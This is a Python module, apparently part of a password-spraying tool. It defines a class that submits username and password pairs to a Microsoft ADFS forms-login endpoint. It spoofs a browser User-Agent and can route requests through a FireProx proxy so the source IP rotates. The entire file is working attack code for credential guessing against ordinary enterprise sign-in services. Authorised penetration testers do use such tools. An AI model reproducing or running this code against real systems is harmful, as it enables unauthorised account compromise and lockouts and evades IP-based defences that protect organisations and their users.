import requests

from .classes.BaseHttpTarget import BaseHttpTarget


class Adfs(BaseHttpTarget):
    """Password spray Microsoft Active Directory Federation Services (ADFS)"""

    def __init__(self, host, port, timeout, fireprox):
        self.timeout = timeout
        self.url = f"https://{host}:{port}"

        if fireprox:
            self.url = f"https://{fireprox}/fireprox"

        self.url += "/adfs/ls/?username=&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=estsredirect%3d2%26estsrequest%3drQIIAY2Rv2_TQACFe3FqaAdAwFoJIRaQnNw5Pp9tqYOdhoZAkqbKj8pLiB07sWv7XOdMkjIjFSFE544VLJkQEhKCBQmmTJ37FwATQkJiJBELY9_w6Y1P37vHoRzS7sB_EYUlBei6SLCdZfsvyfX1ay--mkfPxd8PTt-8vfts9jJzAm7YNEhDKx0FnpX0kmmOJoMZuD1kLB5p-TxNWUDpfo66rmc7BRnnbBrm6biX_wDAGQCzDJELMlFlEcmqrKiqSCQxh1Uiwr4KBRtaqiC5CAuWS2RBJgWRuA5W7T4-z1yt6ykbikvQxDt0fmXWXJqE3ZiO2An3dMtmVpHqg1LJ2E3aHVg0hFqdVUeVKfSresOnrBBNSNBtj-lwEhIa1-HuUJcrpY65v1fxjJ26rxtl0z_AD2tJeeoMpAOzVSxh-mhcbgZpo2uiqtt2mr0oTIXaYeBvIxbJhFW3lBl3IaPvOH5hI6TRnONp7ERe_ywLfmQz8MqfLDhdXfgWP_e_vLr82Hj_ff5a-bSxMl_Nd9RyH1cbUsH248m2tZc2ilajFU_uD9VmbQe7bGTHSgnq5pPWJtHQMQ-Oef4bD37y4OjSyse1C1xzvn5ThEgR0GI9voWwJikaIuZf0"

        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
        }

        self.data = {
            "UserName": "",
            "Password": "",
            "AuthMethod": "FormsAuthentication",
        }

        """
        # proxy settings
        self.http_proxy  = "http://127.0.0.1:8080"
        self.https_proxy = "http://127.0.0.1:8080"
        self.ftp_proxy   = "http://127.0.0.1:8080"

        self.proxyDict = {
              "http"  : self.http_proxy,
              "https" : self.https_proxy,
              "ftp"   : self.ftp_proxy
        }
        """

    def set_username(self, username):
        self.data["UserName"] = username
        self.username = username

    def set_password(self, password):
        self.data["Password"] = password
        self.password = password

    def login(self, username, password):
        # set data
        self.set_username(username)
        self.set_password(password)

        # post the request
        response = requests.post(
            self.url, headers=self.headers, data=self.data, timeout=self.timeout
        )  # , verify=False, proxies=self.proxyDict)
        return response
